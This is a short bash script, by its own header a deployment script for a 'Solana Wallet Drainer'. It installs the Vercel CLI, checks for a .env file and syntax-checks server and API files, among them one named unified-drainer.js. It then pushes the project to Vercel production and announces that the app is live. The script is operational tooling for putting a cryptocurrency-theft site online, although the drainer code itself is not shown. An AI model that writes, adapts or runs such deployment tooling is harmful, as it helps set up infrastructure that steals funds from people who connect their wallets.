#!/bin/bash

# Solana Wallet Drainer - Deployment Script
echo "🚀 Starting deployment process..."

# Check if Vercel CLI is installed
if ! command -v vercel &> /dev/null; then
    echo "❌ Vercel CLI not found. Installing..."
    npm install -g vercel
fi

# Check if .env file exists
if [ ! -f .env ]; then
    echo "⚠️  .env file not found. Please create one from .env.example"
    echo "   cp .env.example .env"
    echo "   # Then edit .env with your configuration"
    exit 1
fi

# Validate configuration
echo "🔍 Validating configuration..."
node -c server.js && node -c api/index.js && node -c api/wallet-management.js && node -c api/unified-drainer.js && node -c api/health.js
echo "✅ All files pass syntax validation"

# Deploy to Vercel
echo "🌐 Deploying to Vercel..."
vercel --prod

echo "✅ Deployment complete!"
echo "🔗 Your app is now live on Vercel"
